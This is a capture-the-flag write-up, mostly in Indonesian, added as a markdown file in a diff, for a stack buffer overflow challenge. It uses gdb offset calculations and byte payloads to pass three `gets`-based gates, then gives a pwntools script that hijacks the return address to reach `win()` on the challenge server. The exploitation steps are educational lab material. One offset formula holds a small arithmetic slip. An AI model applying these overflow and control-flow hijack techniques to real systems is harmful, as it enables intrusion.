@@ -1,0 +1,115 @@
+Have you read the Pwntorial? Ready to graduate from baby pwns?
+
+This should do it. Three gates and a treasure room await your input.
+
+### Step 1 - Tentukan Titik Vulnerability Gate1
+Function `gate1` mengecek apakah `rbp-0x4` == 0? Jika iya, maka gate1 tidak akan terbuka. Untuk lolos dari gate1, ubah `rbp-0x4` agar bernilai bukan 0. Kebetulan, function `gate1` memiliki vulnerability di bagian baris code yang memanggil `gets` dan dapat dimanfaatkan untuk menimpa value dari `rbp-0x4`. Untuk melakukan hal ini, tentukan alamat `rbp-0x4` dan alamat dari buffer yang menampung input dari user.
+
+`(gdb) b *0x0000000000401419` -> leave `gate1`
+`(gdb) r`
+`(gdb) p $rbp-0x4` -> 0x7fffffffdbcc alamat `rbp-0x4`
+`(gdb) p $rbp-0x110` -> 0x7fffffffdac0 alamat buffer
+
+Cara menghitung berapa byte yang dibutuhkan untuk menimpa `rbp-0x4` adalah dengan cara: **offset_buffer - offset_register_yang_ingin_ditimpa = 0x110 - 0x20 = 10C (268d)**
+Jadi setelah 268 byte, input overflow mulai menimpa register `rbp-0x4`.
+
+### Step 2 - Buat Payload Untuk Gate1
+Karena kita ingin menimpa register `rbp-0x4` yang terletak di byte ke-269 sebelum `rbp-0x110`, maka kita harus membuat payload input sebanyak 269 karakter di mana karakter ke 269 haruslah bukan angka 0.
+
+`(cmd) python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*269)' > input.bin`
+`(gdb) run < input.bin`
+
+Output:
+```
+[+] Well done. Gate 1 opens.
+[-] Try again. Gate 2 refuses to open.
+```
+
+### Step 3 - Tentukan Titik Vulnerability Gate2
+Pada function `gate2`, terdapat vulnerability lagi pada `gets`. Perlu diperhatikan bahwa untuk melewati function ini, kita harus menggunakan byte value yang spesifik. Untuk melewati function ini, `rbp-0x8` harus bernilai 0x29 dan register `rbp-0x4` tidak bernilai 0. Langkah yang harus kita lakukan adalah menentukan alamat buffer, alamat `rbp-0x8` dan alamat `rbp-0x4`.
+
+`(gdb) b *0x00000000004013bc` -> leave `gate2`
+`(gdb) r < input.bin` 
+`(gdb) p $rbp-0x210` -> alamat buffer
+`(gdb) p $rbp-0x8` -> alamat `rbp-0x8`
+`(gdb) p $rbp-0x4` -> alamat `rbp-0x4`
+
+Byte yang dibutuhkan untuk menimpa `rbp-0x8` adalah: **0x210 - 0x8 = 208 (520d)**
+Byte yang dibutuhkan untuk menimpa `rbp-0x4` adalah: **0x210 - 0x4 = 20C (524d)**
+**Dengan demikian, byte ke 521 harus berupa 0x29 dan byte ke 525 tidak bernilai 0.**
+
+### Step 4 - Buat Payload Untuk Gate2
+`(cmd) python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*269 + b"\n" + b"\x41"*520 + b"\x29" + b"\x00"*3 + b"\x41")' > input.bin`
+`(gdb) run < input.bin`
+
+Output:
+```
+[+] Well done. Gate 1 opens.
+[+] Well done. Gate 2 opens.
+[-] Try again. Gate 3 slams shut in your face.
+```
+
+### Step 5 - Tentukan Titik Vulnerability Gate3
+Sama seperti `gate2`, pada `gate3` terdapat vulnerability lagi pada `gets` yang dapat digunakan untuk menimpa register yang menampung value untuk perkondisian. Untuk melewati function ini, `rbp-0x4` tidak bernilai 0 dan harus bernilai 0xcc07c9. Langkah yang harus kita lakukan adalah menentukan alamat buffer dan alamat `rbp-0x4`.
+
+`(gdb) b *0x000000000040133a`
+`(gdb) r < input.bin`
+`(gdb) p $rbp-0x50` -> 0x7fffffffdb80 alamat buffer
+`(gdb) p $rbp-0x4` -> 0x7fffffffdbcc alamat `rbp-0x4`
+
+Byte yang dibutuhkan untuk menimpa `rbp-0x4` adalah: **0x50 - 0x4 = 4C (76d)**
+**Dengan demikian, byte ke 77 harus berupa 0xCC07C9.**
+
+### Step 6 - Buat Payload Untuk Gate3
+`(cmd) python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*269 + b"\n" + b"\x41"*520 + b"\x29" + b"\x00"*3 + b"\x41" + b"\n" + b"\x41"*76 + b"\xc9\x07\xcc\x00")' > input.bin`
+`(gdb) run < input.bin`
+
+Output:
+```
+[+] Well done. Gate 1 opens.
+[+] Well done. Gate 2 opens.
+[+] Gate 3 opens, and you find some treasure. It says 'win() is that way, located at 0x40123b'
+
+TREASURE?
+No :(
+
+Program received signal SIGSEGV, Segmentation fault.
+```
+
+Dari sini kita bisa melihat bahwa program berhasil melewati ketiga gerbang namun ketika kembali ke function main, function main memanggil function `treasure_room` yang didalamnya terdapat sebuah vulnerability dari `gets` yang mengambil input dari user dan sebuah print message `TREASURE?`.
+
+### Step 7 - Tentukan Offset
+`(cmd) python3 -c 'from pwn import *; import sys; sys.stdout.buffer.write(b"\x41"*269 + b"\n" + b"\x41"*520 + b"\x29" + b"\x00"*3 + b"\x41" + b"\n" + b"\x41"*76 + b"\xc9\x07\xcc\x00" + b"\n" + cyclic(8000))' > input.bin`
+`(gdb) run < input.bin` 
+`(gdb) x/4gx $rsp` -> 0x7fffffffdbd8:	0x7063617770636176
+`(cmd) pwn cyclic -l 0x7063617770636176`
+
+Buat payload menggunakan python.
+```python
+from pwn import *
+
+p = remote("0.cloud.chals.io", 21543)
+
+gate_1_payload = b"\x41"*269
+gate_2_payload = b"\x41"*520 + b"\x29" + b"\x00"*3 + b"\x41"
+gate_3_payload = b"\x41"*76 + b"\xc9\x07\xcc\x00"
+
+offset = 6776
+
+ret_gadget = p64(0x401499)
+win_addr = p64(0x40123b)
+
+win_payload = b"\x41"*offset + ret_gadget + win_addr
+  
+print(gate_1_payload)
+print(gate_2_payload)
+print(gate_3_payload)
+print(win_payload)
+
+p.sendline(gate_1_payload)
+p.sendline(gate_2_payload)
+p.sendline(gate_3_payload)
+p.sendline(win_payload)
+
+p.interactive()
+```
